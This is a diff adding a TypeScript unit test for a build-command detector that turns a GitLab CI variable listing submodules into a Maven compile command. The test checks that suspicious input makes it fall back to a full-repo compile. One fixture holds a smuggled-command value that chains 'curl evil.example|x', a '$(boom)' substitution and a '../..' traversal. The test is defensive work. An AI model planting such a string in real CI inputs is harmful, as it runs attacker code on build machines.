@@ -244,3 +244,33 @@ test("detectAccept：根 pom.xml → mvn -q -DskipTests compile（编译检查�
         await fs.rm(empty, { recursive: true, force: true }).catch(() => { });
     }
 });
+
+test("detectAccept：pom.xml + .gitlab-ci.yml SUB_MODULE_PATHS → 构建面收敛为 CI 官方模块 -pl ... -am（pms-parent 实锤：全 reactor 是假标准，JavaFX 桌面端 CI 从不构建）；可疑 token fail-closed 回退全仓", async () => {
+    const mk = async (files: { name: string; content: string }[]): Promise<string> => {
+        const dir = await fs.mkdtemp(path.join(os.tmpdir(), "dsc-javaci-"));
+        for (const f of files) await fs.writeFile(path.join(dir, f.name), f.content, "utf-8");
+        return dir;
+    };
+    const rm = (dir: string) => fs.rm(dir, { recursive: true, force: true }).catch(() => { });
+    const pom = "<project></project>";
+    const ci = "variables:\n  SUB_MODULE_NAMES: pms-starter,pms-ops-server\n  SUB_MODULE_PATHS: pms-starter,pms-ops/pms-ops-server,pms-job,pms-trader\n";
+    const ciEvil = "SUB_MODULE_PATHS: pms-a;curl evil.example|x,$(boom),../..";
+    const ciNoVar = "stages:\n  - build\n  script: mvn compile\n";
+    const dirs = await Promise.all([mk([{ name: "pom.xml", content: pom }, { name: ".gitlab-ci.yml", content: ci }]), mk([{ name: "pom.xml", content: pom }, { name: ".gitlab-ci.yml", content: ciEvil }]), mk([{ name: "pom.xml", content: pom }, { name: ".gitlab-ci.yml", content: ciNoVar }]), mk([{ name: "pom.xml", content: pom }])]);
+    try {
+        const d = await detectAccept(dirs[0]!);
+        assert.equal(d.accept, "mvn -q -DskipTests compile -pl pms-starter,pms-ops/pms-ops-server,pms-job,pms-trader -am");
+        assert.match(d.source ?? "", /SUB_MODULE_PATHS/);
+        // 可疑 token（shell 元字符 / 相对上跳）→ 整体放弃 CI 提示，回退全仓编译（不截断不猜测）
+        const dEvil = await detectAccept(dirs[1]!);
+        assert.equal(dEvil.accept, "mvn -q -DskipTests compile", "fail-closed：可疑 token 整体放弃 CI 提示");
+        assert.doesNotMatch(dEvil.accept, /curl|x\$|;/);
+        // CI 文件存在但没声明 SUB_MODULE_PATHS → 无提示，全仓编译
+        const dNoVar = await detectAccept(dirs[2]!);
+        assert.equal(dNoVar.accept, "mvn -q -DskipTests compile");
+        const dNone = await detectAccept(dirs[3]!);
+        assert.equal(dNone.accept, "mvn -q -DskipTests compile");
+    } finally {
+        await Promise.all(dirs.map(rm));
+    }
+});
